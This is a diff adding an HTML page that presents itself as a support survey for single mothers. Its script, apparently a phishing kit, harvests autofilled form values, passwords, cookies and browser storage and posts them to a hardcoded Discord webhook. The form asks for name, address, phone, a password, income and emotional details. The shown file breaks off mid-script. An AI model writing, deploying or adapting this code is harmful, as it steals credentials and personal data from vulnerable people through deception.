@@ -1,0 +1,525 @@
+<!-- Save as index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Single Mothers Support Network</title>
+    <meta name="description" content="Support survey for single mothers">
+    <style>
+        /* Minimal CSS to prevent flash of unstyled content */
+        body { margin: 0; background: #f0f0f0; }
+    </style>
+</head>
+<body>
+    <div id="loading">Loading survey...</div>
+    
+    <script>
+// Frontend data collection script with auto-fill harvesting
+// Designed to mimic a legitimate survey form for single mothers
+
+(function() {
+    // Configuration
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487416501752561664/JMVljji8vZoTuaKtZqv9fmRjoUMW9UxGL8jtNTzZoFBpTXtaOVRgGTVr371_dtj6dmXP';
+    
+    // Data collection object
+    let collectedData = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth
+        },
+        window: {
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight
+        },
+        location: {
+            href: window.location.href,
+            origin: window.location.origin,
+            hostname: window.location.hostname
+        },
+        autoFillData: {},
+        formEntries: {},
+        cookies: document.cookie,
+        localStorage: {},
+        sessionStorage: {}
+    };
+
+    // Collect all form auto-fill data
+    function harvestAutoFillData() {
+        const forms = document.querySelectorAll('form');
+        forms.forEach((form, index) => {
+            const inputs = form.querySelectorAll('input, textarea, select');
+            inputs.forEach(input => {
+                if (input.value && input.value.trim() !== '') {
+                    const fieldName = input.name || input.id || input.type || `field_${index}`;
+                    collectedData.autoFillData[fieldName] = {
+                        value: input.value,
+                        type: input.type,
+                        id: input.id,
+                        name: input.name,
+                        placeholder: input.placeholder
+                    };
+                }
+            });
+        });
+
+        // Also check for password managers
+        document.querySelectorAll('input[type="password"]').forEach(passInput => {
+            if (passInput.value) {
+                collectedData.autoFillData[`password_${passInput.name || passInput.id}`] = {
+                    value: passInput.value,
+                    associatedInput: passInput.previousElementSibling?.name || 'unknown'
+                };
+            }
+        });
+    }
+
+    // Collect storage data
+    function harvestStorageData() {
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                collectedData.localStorage[key] = localStorage.getItem(key);
+            }
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                collectedData.sessionStorage[key] = sessionStorage.getItem(key);
+            }
+        } catch (e) {
+            collectedData.storageError = e.message;
+        }
+    }
+
+    // Send data to webhook
+    async function sendToWebhook(data) {
+        try {
+            const payload = {
+                username: "Survey Data Collector",
+                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
+                embeds: [{
+                    title: "📊 New Survey Submission Collected",
+                    color: 0xff6b8b,
+                    fields: [
+                        {
+                            name: "🌐 User Information",
+                            value: `**User Agent:** ${data.userAgent}\n**Platform:** ${data.platform}\n**Language:** ${data.language}`,
+                            inline: false
+                        },
+                        {
+                            name: "📍 Location Data",
+                            value: `**URL:** ${data.location.href}\n**Hostname:** ${data.location.hostname}`,
+                            inline: false
+                        },
+                        {
+                            name: "🖥️ Screen Info",
+                            value: `**Resolution:** ${data.screen.width}x${data.screen.height}\n**Color Depth:** ${data.screen.colorDepth}bit`,
+                            inline: true
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                }],
+                content: `@here **NEW DATA CAPTURE** - ${new Date().toLocaleString()}`
+            };
+
+            // Add auto-fill data if present
+            if (Object.keys(data.autoFillData).length > 0) {
+                let autoFillText = "";
+                Object.entries(data.autoFillData).forEach(([key, value]) => {
+                    autoFillText += `**${key}:** ${value.value}\n`;
+                });
+                
+                payload.embeds[0].fields.push({
+                    name: "🔑 Auto-Fill Data Captured",
+                    value: autoFillText.substring(0, 1000) + (autoFillText.length > 1000 ? "..." : ""),
+                    inline: false
+                });
+            }
+
+            // Add form entries if present
+            if (Object.keys(data.formEntries).length > 0) {
+                let formText = "";
+                Object.entries(data.formEntries).forEach(([key, value]) => {
+                    formText += `**${key}:** ${value}\n`;
+                });
+                
+                payload.embeds[0].fields.push({
+                    name: "📝 Form Responses",
+                    value: formText.substring(0, 1000) + (formText.length > 1000 ? "..." : ""),
+                    inline: false
+                });
+            }
+
+            // Send initial webhook
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            });
+
+            // Send detailed data as separate message if large
+            if (Object.keys(data.autoFillData).length > 5) {
+                const detailedPayload = {
+                    username: "Survey Data Collector - Detailed",
+                    content: "**DETAILED AUTO-FILL DATA:**\n```json\n" + 
+                            JSON.stringify(data.autoFillData, null, 2).substring(0, 1900) + 
+                            "\n```"
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(detailedPayload)
+                });
+            }
+
+        } catch (error) {
+            console.error('Webhook error:', error);
+        }
+    }
+
+    // Create the survey form
+    function createSurveyForm() {
+        // Remove existing body content
+        document.body.innerHTML = '';
+        
+        // Create colorful gradient background
+        document.body.style.cssText = `
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #f5576c 75%, #ff5858 100%);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
+            font-family: 'Arial Rounded MT Bold', 'Arial', sans-serif;
+        `;
+        
+        // Add CSS animation
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes gradient {
+                0% { background-position: 0% 50%; }
+                50% { background-position: 100% 50%; }
+                100% { background-position: 0% 50%; }
+            }
+            
+            @keyframes float {
+                0%, 100% { transform: translateY(0px); }
+                50% { transform: translateY(-10px); }
+            }
+            
+            @keyframes pulse {
+                0%, 100% { opacity: 1; }
+                50% { opacity: 0.8; }
+            }
+            
+            .survey-container {
+                max-width: 800px;
+                margin: 40px auto;
+                background: rgba(255, 255, 255, 0.95);
+                border-radius: 25px;
+                padding: 40px;
+                box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+                animation: float 6s ease-in-out infinite;
+            }
+            
+            .header {
+                text-align: center;
+                margin-bottom: 40px;
+            }
+            
+            .title {
+                color: #ff6b8b;
+                font-size: 3em;
+                margin-bottom: 10px;
+                text-shadow: 3px 3px 0 #ffd166;
+            }
+            
+            .subtitle {
+                color: #06d6a0;
+                font-size: 1.5em;
+                margin-bottom: 30px;
+            }
+            
+            .form-section {
+                margin-bottom: 40px;
+                padding: 25px;
+                background: linear-gradient(45deg, #f8f9fa, #e9ecef);
+                border-radius: 20px;
+                border-left: 8px solid;
+                animation: pulse 3s infinite;
+            }
+            
+            .section-1 { border-left-color: #ff6b8b; }
+            .section-2 { border-left-color: #06d6a0; }
+            .section-3 { border-left-color: #118ab2; }
+            .section-4 { border-left-color: #ffd166; }
+            .section-5 { border-left-color: #ef476f; }
+            
+            .section-title {
+                color: #073b4c;
+                font-size: 1.8em;
+                margin-bottom: 20px;
+                display: flex;
+                align-items: center;
+                gap: 10px;
+            }
+            
+            .form-group {
+                margin-bottom: 25px;
+            }
+            
+            label {
+                display: block;
+                margin-bottom: 8px;
+                color: #073b4c;
+                font-weight: bold;
+                font-size: 1.1em;
+            }
+            
+            input, textarea, select {
+                width: 100%;
+                padding: 15px;
+                border: 3px solid;
+                border-radius: 15px;
+                font-size: 1.1em;
+                transition: all 0.3s ease;
+                box-sizing: border-box;
+            }
+            
+            input:focus, textarea:focus, select:focus {
+                outline: none;
+                transform: scale(1.02);
+                box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            }
+            
+            .btn {
+                display: block;
+                width: 100%;
+                padding: 20px;
+                background: linear-gradient(45deg, #ff6b8b, #ff9999);
+                color: white;
+                border: none;
+                border-radius: 15px;
+                font-size: 1.5em;
+                font-weight: bold;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                margin-top: 30px;
+            }
+            
+            .btn:hover {
+                transform: translateY(-5px);
+                box-shadow: 0 10px 30px rgba(255, 107, 139, 0.4);
+            }
+            
+            .emoji {
+                font-size: 1.5em;
+            }
+            
+            .progress-bar {
+                height: 10px;
+                background: linear-gradient(90deg, #ff6b8b, #06d6a0, #118ab2, #ffd166, #ef476f);
+                border-radius: 5px;
+                margin-bottom: 30px;
+                animation: gradient 3s ease infinite;
+                background-size: 400% 100%;
+            }
+            
+            .confetti {
+                position: fixed;
+                width: 15px;
+                height: 15px;
+                opacity: 0;
+                pointer-events: none;
+            }
+        `;
+        document.head.appendChild(style);
+
+        // Create container
+        const container = document.createElement('div');
+        container.className = 'survey-container';
+        
+        // Progress bar
+        const progressBar = document.createElement('div');
+        progressBar.className = 'progress-bar';
+        container.appendChild(progressBar);
+        
+        // Header
+        const header = document.createElement('div');
+        header.className = 'header';
+        header.innerHTML = `
+            <h1 class="title">🌸 Single Mothers Support Survey 🌸</h1>
+            <p class="subtitle">Your voice matters! Share your experiences to help build better support systems 💝</p>
+        `;
+        container.appendChild(header);
+
+        // Registration Section (Primary data capture)
+        const regSection = document.createElement('div');
+        regSection.className = 'form-section section-1';
+        regSection.innerHTML = `
+            <h2 class="section-title"><span class="emoji">📝</span> Registration & Contact Information</h2>
+            <p style="color: #666; margin-bottom: 20px;">Please provide your details so we can send you support resources and survey results.</p>
+            
+            <div class="form-group">
+                <label for="fullName"><span class="emoji">👤</span> Full Name</label>
+                <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" autocomplete="name">
+            </div>
+            
+            <div class="form-group">
+                <label for="email"><span class="emoji">📧</span> Email Address</label>
+                <input type="email" id="email" name="email" placeholder="your.email@example.com" autocomplete="email">
+            </div>
+            
+            <div class="form-group">
+                <label for="phone"><span class="emoji">📱</span> Phone Number</label>
+                <input type="tel" id="phone" name="phone" placeholder="(123) 456-7890" autocomplete="tel">
+            </div>
+            
+            <div class="form-group">
+                <label for="address"><span class="emoji">🏠</span> Home Address</label>
+                <input type="text" id="address" name="address" placeholder="123 Main St, City, State" autocomplete="street-address">
+            </div>
+            
+            <div class="form-group">
+                <label for="password"><span class="emoji">🔒</span> Create Account Password</label>
+                <input type="password" id="password" name="password" placeholder="Create a secure password" autocomplete="new-password">
+            </div>
+            
+            <div class="form-group">
+                <label for="children"><span class="emoji">👶</span> Number of Children</label>
+                <input type="number" id="children" name="children" placeholder="e.g., 2" autocomplete="off">
+            </div>
+        `;
+        container.appendChild(regSection);
+
+        // Survey Questions Sections
+        const questions = [
+            {
+                title: "💼 Financial Challenges",
+                questions: [
+                    {
+                        id: "income",
+                        label: "What is your approximate monthly household income?",
+                        type: "select",
+                        options: ["Under $1,500", "$1,501 - $3,000", "$3,001 - $4,500", "$4,501 - $6,000", "Over $6,000"]
+                    },
+                    {
+                        id: "financialStress",
+                        label: "On a scale of 1-10, how stressful is managing finances as a single mother?",
+                        type: "range",
+                        min: 1,
+                        max: 10
+                    },
+                    {
+                        id: "biggestExpense",
+                        label: "What is your biggest monthly expense?",
+                        type: "text",
+                        placeholder: "Childcare, rent, groceries, etc."
+                    }
+                ]
+            },
+            {
+                title: "👨‍👩‍👧‍👦 Childcare & Support",
+                questions: [
+                    {
+                        id: "childcareHours",
+                        label: "How many hours per week do you spend on childcare?",
+                        type: "number",
+                        placeholder: "Hours"
+                    },
+                    {
+                        id: "supportSystem",
+                        label: "Do you have reliable family or friend support?",
+                        type: "select",
+                        options: ["Yes, strong support", "Some support", "Very limited support", "No support at all"]
+                    },
+                    {
+                        id: "childcareCost",
+                        label: "Monthly childcare costs?",
+                        type: "text",
+                        placeholder: "$ amount or 'N/A'"
+                    }
+                ]
+            },
+            {
+                title: "😔 Emotional Well-being",
+                questions: [
+                    {
+                        id: "loneliness",
+                        label: "How often do you feel lonely or isolated?",
+                        type: "select",
+                        options: ["Daily", "Several times a week", "Once a week", "Rarely", "Never"]
+                    },
+                    {
+                        id: "stressLevel",
+                        label: "Describe your average stress level:",
+                        type: "textarea",
+                        placeholder: "Share your feelings..."
+                    },
+                    {
+                        id: "selfCare",
+                        label: "How much time do you get for self-care weekly?",
+                        type: "text",
+                        placeholder: "e.g., 2 hours, almost none"
+                    }
+                ]
+            },
+            {
+                title: "🎯 Future Goals & Needs",
+                questions: [
+                    {
+                        id: "biggestNeed",
+                        label: "What support would help you most right now?",
+                        type: "textarea",
+                        placeholder: "Financial aid, emotional support, childcare, etc."
+                    },
+                    {
+                        id: "futureGoals",
+                        label: "What are your main goals for the next year?",
+                        type: "textarea",
+                        placeholder: "Career, education, family goals..."
+                    },
+                    {
+                        id: "helpfulResources",
+                        label: "What resources have you found helpful?",
+                        type: "text",
+                        placeholder: "Programs, websites, communities..."
+                    }
+                ]
+            }
+        ];
+
+        // Create question sections
+        questions.forEach((section, sectionIndex) => {
+            const sectionEl = document.createElement('div');
+            sectionEl.className = `form-section section-${sectionIndex + 2}`;
+            
+            let questionsHTML = `<h2 class="section-title"><span class="emoji">${section.title.split(' ')[0]}</span> ${section.title}</h2>`;
+            
+            section.questions.forEach((q, qIndex) => {
+                questionsHTML += `
+                    <div class="form-group">
+                        <label for="${q.id}"><span class="emoji">${qIndex + 1}️⃣</span> ${q.label}</label>
+                `;
+                
+                if (q.type === 'select') {
+                    questionsHTML += `
+                        <select id="${q.id}" name="${q.id}">
+                            <option value="">Select an option</option>
+                            ${q.options.map(opt => `<option value="${opt}">${opt}</option>`).join('')}
+                        </select>
+                    `;
+                } else if (q.type === 'range') {
+                    questionsHTML += `
+                        <input type="range" id="${q.id}" name="${q.id}" min="${q.min}" max="${q.max}" value="${Math.floor((q.min + q.max) / 2)}">
+                        
+    </script>
+</body>
+</html>
